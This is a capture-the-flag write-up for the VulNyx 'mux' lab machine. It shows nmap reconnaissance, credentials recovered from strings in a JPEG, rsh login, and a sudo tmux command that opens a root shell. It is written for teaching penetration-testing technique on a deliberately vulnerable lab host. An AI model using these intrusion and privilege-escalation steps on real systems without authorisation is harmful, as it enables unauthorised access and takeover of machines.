# mux

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| mux | d4t4s3c | Low | VulNyx |

**Summary:** The mux machine exposed an Apache web server on port 80 alongside legacy remote shell services on ports 512, 513, and 514. The web page presented a simple Monna Lisa themed site that loaded `image.jpg`, making the image the primary artifact for further inspection. Steganography cracking with `stegseek` did not recover a valid passphrase, and metadata analysis with `exiftool` revealed a Lisa related comment, but the working credential was recovered by extracting printable strings from the JPEG, which exposed `lisa:Gi0c0nd@`. Because the host exposed Netkit rsh services, the recovered credentials were used directly with `rsh` to obtain a shell as the local user `lisa`. Once inside, sudo policy enumeration showed that `lisa` could run `/usr/bin/tmux` as root without a password. Launching tmux with `/bin/sh` as the command parameter spawned a root shell immediately, allowing full compromise of the system and access to both the user and root flags.

---

## Reconnaissance

The assessment began by discovering the target on the local lab network and then enumerating all exposed TCP services.

1. An Nmap ping sweep identified the target host at `192.168.56.123`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 07:50 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.0033s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0037s latency).
MAC Address: 08:00:27:E9:E5:00 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.123 (192.168.56.123)
Host is up (0.0013s latency).
MAC Address: 08:00:27:2B:EC:09 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 5.93 seconds
                                                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.123
```

2. A full TCP scan revealed four open ports:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -T4 --min-rate=3000 -Pn $ip  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 07:51 -0400
Nmap scan report for 192.168.56.123 (192.168.56.123)
Host is up (0.00028s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
80/tcp  open  http
512/tcp open  exec
513/tcp open  login
514/tcp open  shell
MAC Address: 08:00:27:2B:EC:09 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.09 seconds
```

3. Service and script detection confirmed Apache on port 80 and Netkit remote shell services on ports 512 and 514:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p 80,512,513,514 -sC -sV -T4 -Pn $ip 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 07:56 -0400
Nmap scan report for 192.168.56.123 (192.168.56.123)
Host is up (0.00077s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Monna Lisa
512/tcp open  exec    netkit-rsh rexecd
513/tcp open  login?
514/tcp open  shell   Netkit rshd
MAC Address: 08:00:27:2B:EC:09 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.39 seconds
```

The presence of `rsh`, `rexec`, and `rlogin` style services was immediately notable because these protocols are legacy authentication mechanisms and frequently expose weak credential based access paths.

---

## Web Enumeration

4. The web application was requested directly to inspect its source:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl http://$ip/            
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Monna Lisa</title>
  <style>
    body {
      background-color: black;
      margin: 0;
      overflow: hidden;
    }

    img {
      width: 50%;
      height: auto;
      display: block;
      margin: auto;
      padding-top: 20vh;
    }
  </style>
</head>
<body>
  <img src="image.jpg" alt="Monna Lisa">
</body>
</html>
```

The page was minimal and served a single image named `image.jpg`, so the image became the focus of content analysis.

5. The image was downloaded and inspected with both steganography and metadata tools:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ wget http://$ip/image.jpg
--2026-08-14 08:00:43--  http://192.168.56.123/image.jpg
Connecting to 192.168.56.123:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 259621 (254K) [image/jpeg]
Saving to: ‘image.jpg’

image.jpg                     100%[==============================================>] 253.54K  --.-KB/s    in 0.004s  

2026-08-14 08:00:43 (68.5 MB/s) - ‘image.jpg’ saved [259621/259621]

                                                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ stegseek image.jpg  
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.89% (133.3 MB)           
[!] error: Could not find a valid passphrase.
                                                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ exiftool image.jpg                   
ExifTool Version Number         : 13.55
File Name                       : image.jpg
Directory                       : .
File Size                       : 260 kB
File Modification Date/Time     : 2023:12:01 04:32:14-05:00
File Access Date/Time           : 2026:08:14 08:00:46-04:00
File Inode Change Date/Time     : 2026:08:14 08:00:43-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Comment                         : lisa:My_$3cUr3_RSH_p@zz
Image Width                     : 800
Image Height                    : 1188
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 800x1188
Megapixels                      : 0.950
```

Although `stegseek` did not recover an embedded file, the EXIF comment disclosed a Lisa related value that warranted deeper inspection of the JPEG content.

6. A strings check revealed the actual usable credential inside the image data:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ strings image.jpg | grep lisa
lisa:My_$3cUr3_RSH_p@zz
lisa:Gi0c0nd@
```

The value `lisa:Gi0c0nd@` was the valid login credential used for the remote shell service.

---

## Initial Access

### RSH Login with Recovered Credentials

7. Since the host exposed Netkit rsh services, the recovered credential `lisa:Gi0c0nd@` was tested with `rsh`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ rsh -l lisa $ip
Password: 
lisa@mux:~$ id;hostname
uid=1000(lisa) gid=1000(lisa) grupos=1000(lisa)
mux
```

The login succeeded and provided an interactive shell as the user `lisa`.

---

## Privilege Escalation

### Sudo Rights on tmux

8. Sudo permissions were enumerated for the compromised user:

```bash
lisa@mux:~$ sudo -l
Matching Defaults entries for lisa on mux:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lisa may run the following commands on mux:
    (root) NOPASSWD: /usr/bin/tmux
lisa@mux:~$ sudo -u root /usr/bin/tmux -c /bin/sh
# id;hostname
uid=0(root) gid=0(root) grupos=0(root)
mux
# cat /home/lisa/user.txt /root/root.txt
```

The sudo policy allowed `lisa` to execute `/usr/bin/tmux` as root without a password. Using the `-c /bin/sh` option caused tmux to start a root shell directly, completing the privilege escalation.

---

## Attack Chain Summary

1. **Reconnaissance**: Network discovery identified `192.168.56.123`, and port scanning revealed Apache on port 80 plus legacy Netkit remote shell services on ports 512, 513, and 514.

2. **Vulnerability Discovery**: The web page served a Monna Lisa image, and string extraction from `image.jpg` exposed the credential pair `lisa:Gi0c0nd@`.

3. **Exploitation**: The recovered credential was used against the exposed `rsh` service, granting a shell as the local user `lisa`.

4. **Internal Enumeration**: Running `sudo -l` showed that `lisa` could execute `/usr/bin/tmux` as root without a password.

5. **Privilege Escalation**: The `tmux -c /bin/sh` option was invoked through sudo to launch a root shell and complete the compromise.
